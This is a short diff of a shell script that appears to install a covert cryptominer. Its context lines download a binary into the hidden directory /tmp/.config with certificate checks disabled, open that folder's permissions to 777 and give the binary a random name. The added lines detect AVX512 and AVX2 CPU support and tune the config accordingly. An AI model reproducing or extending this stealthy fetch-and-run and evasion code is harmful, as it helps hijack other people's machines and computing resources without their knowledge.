@@ -33,6 +33,12 @@ wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
 chmod -R 777 "/tmp/.config"
 sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "/tmp/.config/appsettings.json"
 
+cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX512'
+[ "$?" == "0" ] && AVX512=1 || AVX512=0
+cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
+[ "$?" == "0" ] && [ "$AVX512" == "0" ] && AVX2=1 || AVX2=0
+[ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "/tmp/.config/appsettings.json"
+[ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "/tmp/.config/appsettings.json"
 
 if [ "$mode" == "0" ]; then
   name=`RandString 2 c${cores}_${addr}`;
